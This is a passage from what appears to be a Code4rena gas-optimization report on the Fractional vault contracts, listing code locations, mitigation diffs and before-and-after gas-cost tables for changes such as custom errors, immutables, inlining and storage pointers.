277:                 ? _to != address(0) 278:                 : INFTReceiver(_to).onERC1155Received( 279:                     msg.sender, 280:                     _from, 281:                     _id, 282:                     _amount, 283:                     _data 284:                 ) == INFTReceiver.onERC1155Received.selector, 285:             "UNSAFE_RECIPIENT" 286:         ); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L297 ```cpp 297:         require(metadata[_id] != address(0), "NO METADATA"); ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, "wont generate root for single leaf"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, "wont generate root for single leaf"); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace require and revert statements with custom errors.  For instance, in `FERC1155.sol`:  ```diff -297:         require(metadata[_id] != address(0), "NO METADATA"); +if (metadata[_id] == address(0)) { +  revert NoMetadata(); +} ```  and define the custom error in the contract  ```diff +error NoMetadata(); ```  - original gas costs:\ ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1863562           ┆ 9340            ┆       ┆        ┆       ┆         │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  - new gas costs with the changes made above - ie one require statement changed into a custom error:\ ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1857755           ┆ 9311            ┆       ┆        ┆       ┆         │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  - `5807` gas saved upon deployment.  # Empty blocks should emit an event  ## PROBLEM  Empty blocks should emit an event, or revert. If not, they can simply be removed to save gas upon deployment. This is valid for `receive()` functions, but also `constructors`  ## PROOF OF CONCEPT  4 instances:  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32 ```cpp 32:     receive() external payable {} ```  ### src/modules/Buyout.sol#L53  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53 ```cpp 53:     receive() external payable {} ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L63 ```cpp 63:     receive() external payable {} ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L8 ```cpp 8:     constructor() {} ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Emit an event in these blocks, or remove them altogether.   # Event fields are redundant  ## PROBLEM  `block.timestamp` and `block.number` are added to event information by default, explicitly adding them is a waste of gas.  ## PROOF OF CONCEPT  1 instance:  ### src/modules/Buyout.sol  ```cpp 100:        emit Start( 101:             _vault, 102:             msg.sender, 103:             block.timestamp, 104:             buyoutPrice, 105:             fractionPrice 106:         ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Remove the event field emitting `block.timestamp`, as it is redundant.  # Functions with access control cheaper if payable  ## PROBLEM  A function with access control marked as payable will be cheaper for legitimate callers: the compiler removes checks for `msg.value`, saving approximately `20` gas per function call.  ## PROOF OF CONCEPT  Instances:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L56-L60 ```cpp 56:     function burn( 57:         address _from, 58:         uint256 _id, 59:         uint256 _amount 60:     ) external onlyRegistry ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L79-L84 ```cpp 79:     function mint( 80:         address _to, 81:         uint256 _id, 82:         uint256 _amount, 83:         bytes memory _data 84:     ) external onlyRegistry ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L198 ```cpp 198:     function setContractURI(string calldata _uri) external onlyController  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L205-L207 ```cpp 205:     function setMetadata(address _metadata, uint256 _id) 206:         external 207:         onlyController ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L217-L221 ```cpp 217:     function setRoyalties( 218:         uint256 _id, 219:         address _receiver, 220:         uint256 _percentage 221:     ) external onlyController  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229-L231 ```cpp 229:     function transferController(address _newController) 230:         external 231:         onlyController ```  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L76 ```cpp 76:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87 ```cpp 87:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L94 ```cpp 94:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L102 ```cpp 102:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these functions as `payable`  # Immutable variables save storage  ## PROBLEM  If a variable is set in the constructor and never modified afterwards, marking it as `immutable` can save a storage slot - `20,000` gas. This also saves `97` gas on every read access of the variable.  ## PROOF OF CONCEPT  8 instances:  ### src/VaultFactory.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15 ```cpp 15:     address public implementation ```  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33 ```cpp 29:     address public registry 31:     address public supply 33:     address public transfer ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39 ```cpp 37:     address payable public buyout 39:     address public registry ```  ### src/modules/Minter.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14 ```cpp 14:     address public supply; ```  ### src/modules/protoforms/BaseVault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L19 ```cpp 19:     address public registry ```    ## TOOLS USED  Manual Analysis  ## MITIGATION  Mark these variables as `immutable`.  # Inline functions  ## PROBLEM  When we define internal functions to perform computation:  - The contract’s code size gets bigger - the function call consumes more gas than executing it as an inlined function (part of the code, without the function call)  When it does not affect readability, it is recommended to inline functions in order to save gas  ## PROOF OF CONCEPT  3 instances:  ### src/FERC1155.sol  ```cpp 324:    function _computePermitStructHash( 325:         address _owner, 326:         address _operator, 327:         uint256 _id, 328:         bool _approved, 329:         uint256 _deadline 330:     ) internal returns (bytes32)  ```  ```cpp 350:     function _computePermitAllStructHash( 351:         address _owner, 352:         address _operator, 353:         bool _approved, 354:         uint256 _deadline 355:     ) internal returns (bytes32)  ```  ### src/Vault.sol  ```cpp 142:     function _revertedWithReason(bytes memory _response) internal pure  ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Inline these functions where they are called:  - gas costs before inlining:  ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1863562           ┆ 9340            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name     ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permit            ┆ 898             ┆ 26460 ┆ 25659  ┆ 49995 ┆ 12      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permitAll         ┆ 853             ┆ 27880 ┆ 25585  ┆ 49588 ┆ 13      │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ╭────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ Vault contract         ┆                 ┆       ┆        ┆       ┆         │ ╞════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 816851                 ┆ 4112            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ execute                ┆ 3585            ┆ 40629 ┆ 61371  ┆ 66336 ┆ 182     │ ╰────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  - gas costs after inlining:  ╭───────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ FERC1155 contract ┆                 ┆       ┆        ┆       ┆         │ ╞═══════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost   ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 1833333           ┆ 9189            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name     ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permit            ┆ 898             ┆ 26348 ┆ 25519  ┆ 49855 ┆ 12      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ permitAll         ┆ 853             ┆ 27768 ┆ 25447  ┆ 49450 ┆ 13      │ ╰───────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ╭────────────────────────┬─────────────────┬───────┬────────┬───────┬─────────╮ │ Vault contract         ┆                 ┆       ┆        ┆       ┆         │ ╞════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 815051                 ┆ 4103            ┆       ┆        ┆       ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ execute                ┆ 3585            ┆ 40628 ┆ 61371  ┆ 66336 ┆ 182     │ ╰────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯  In `FERC1155.sol`:  - `30,229` gas is saved upon deployment - `112` gas is saved per `permit` call on average  - `112` gas is saved per `permitAll` call on average   In `Vault.sol`:  - `1,800` gas is saved upon deployment    # Mathematical optimizations  ## PROBLEM  X += Y costs `22` more gas than X = X + Y. This can mean a lot of gas wasted in a function call when the computation is repeated `n` times (loops)  ## PROOF OF CONCEPT  15 instances include:  ### src/FERC1155.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L62 ```cpp 62:        totalSupply[_id] -= _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L86 ```cpp 86:        totalSupply[_id] += _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L270-L271 ```cpp 270:         balanceOf[_from][_id] -= _amount; 271:         balanceOf[_to][_id] += _amount; ```  ### src/modules/Buyout.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L139 ```cpp 139:         buyoutInfo[_vault].ethBalance -= ethAmount ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L176 ```cpp 176:         buyoutInfo[_vault].ethBalance += msg.value ```  ### src/modules/Migration.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L123 ```cpp 123:         proposal.totalEth += msg.value; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L124 ```cpp 124:         userProposalEth[_proposalId][msg.sender] += msg.value; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L134 ```cpp 134:         proposal.totalFractions += _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L135 ```cpp 135:         userProposalFractions[_proposalId][msg.sender] += _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L156 ```cpp 156:         proposal.totalFractions -= _amount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L160 ```cpp 160:         proposal.totalEth -= ethAmount; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L497 ```cpp 497:                 treeLength += IModule(_modules[i]).getLeafNodes().length; ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L147 ```cpp 147:             for (uint256 i; i < length - 1; i += 2)  ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L190 ```cpp 190:             ceil -= pOf2; ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  use `X = X + Y` instead of `X += Y` (same with `-`)  # Modifier instead of duplicate require  ## PROBLEM  When a `require` statement is used multiple times, it is cheaper in deployment costs to use a modifier instead.  ## PROOF OF CONCEPT  2 instances where a modifier can be used:  ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L76 ```cpp 76:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L87 ```cpp 87:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L94 ```cpp 94:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L102 ```cpp 102:         if (owner != msg.sender) revert NotOwner(owner, msg.sender); ```  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, "wont generate root for single leaf"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, "wont generate root for single leaf"); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use modifiers for these repeated statements   # Prefix increments  ## IMPACT  Prefix increments are cheaper than postfix increments - `6` gas. This can mean interesting savings in `for` loops.  ## PROOF OF CONCEPT  2 instances:  ### src/Vault.sol  ```cpp 78:         for (uint256 i = 0; i < length; i++) ```  ```cpp 104:         for (uint256 i = 0; i < length; i++) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  change `i++` to `++i`.  # Revert strings length  ## IMPACT  Revert strings cost more gas to deploy if the string is larger than 32 bytes. It costs an extra `9,500` gas per string exceeding that 32-byte size upon deployment.  ## PROOF OF CONCEPT  Revert strings exceeding 32 bytes include instances:  ### src/utils/MerkleBase.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62 ```cpp 62:         require(_data.length > 1, "wont generate root for single leaf"); ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78 ```cpp 78:         require(_data.length > 1, "wont generate root for single leaf"); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Write the error strings so that they do not exceed 32 bytes. For further gas savings, consider also using [custom errors](#custom-errors).   # Shifting cheaper than division  ## IMPACT  A division by 2 can be calculated by shifting one to the right. While the `DIV` opcode uses `5` gas, the `SHR` opcode only uses `3` gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ## PROOF OF CONCEPT  3 instances:  ### src/utils/MerkleBase.sol  ```cpp 100:                 _node = _node / 2 ```  ```cpp 136:                 result = new bytes32[](length / 2 + 1); ```  ```cpp 142:                 result = new bytes32[](length / 2) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `/ 2` with `>>1`   # Storage cheaper than memory  ## PROBLEM  Reference types cached in memory cost more gas than using storage, as new memory is allocated for these variables, copying data from storage to memory.  ## PROOF OF CONCEPT  Instances:  ### src/VaultRegistry.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L40 ```cpp 40:         VaultInfo memory info = vaultToToken[msg.sender]; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L118 ```cpp 118:         VaultInfo memory info = vaultToToken[msg.sender]; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L128 ```cpp 128:         VaultInfo memory info = vaultToToken[_vault]; ```  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L136 ```cpp 136:         VaultInfo memory info = vaultToToken[_vault]; ```  - original gas costs with these `VaultInfo memory info`  ╭────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ VaultRegistry contract ┆                 ┆        ┆        ┆        ┆         │ ╞════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3898606                ┆ 19409           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ burn                   ┆ 2349            ┆ 4218   ┆ 4255   ┆ 4255   ┆ 52      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mint                   ┆ 51597           ┆ 54389  ┆ 54845  ┆ 54845  ┆ 107     │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ totalSupply            ┆ 1878            ┆ 1878   ┆ 1878   ┆ 1878   ┆ 203     |   ╰────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - new gas costs with these four instances as `VaultInfo storage info`  ╭────────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ VaultRegistry contract ┆                 ┆        ┆        ┆        ┆         │ ╞════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 3881997                ┆ 19326           ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ burn                   ┆ 2268            ┆ 4153   ┆ 4190   ┆ 4190   ┆ 52      │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mint                   ┆ 51516           ┆ 54308  ┆ 54764  ┆ 54764  ┆ 107     │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ totalSupply            ┆ 1833            ┆ 1833   ┆ 1833   ┆ 1833   ┆ 203     |   ╰────────────────────────┴─────────────────┴────────┴────────┴────────┴─────────╯  - `16,609` gas is saved upon deployment - `80` gas is saved per `mint` call on average  - `65` gas is saved per `burn` call on average  - `45` gas is saved per `totalSupply` call.   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `storage` instead of `memory`  # Storage pointer for structs  ## PROBLEM  Using a `storage` pointer is cheaper than reading a struct field several times.  ## PROOF OF CONCEPT  Instances:  ### src/modules/Buyout.sol  ```cpp 297:         (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = ( 298:             State.SUCCESS, 299:             msg.sender 300:         ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Use a `storage` pointer   ```diff +        Auction storage _vaultInfo = buyoutInfo[_vault]; +       (_vaultInfo.state, _vaultInfo.proposer) = ( -297:         (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = ( 298:             State.SUCCESS, 299:             msg.sender 300:         ); ```   - original gas costs   ╭──────────────────────┬─────────────────┬────────┬────────┬────────┬─────────╮ │ Buyout contract      ┆                 ┆        ┆        ┆        ┆         │ ╞══════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡ │ Deployment Cost      ┆ Deployment Size ┆        ┆        ┆        ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 2779003              ┆ 13880           ┆        ┆        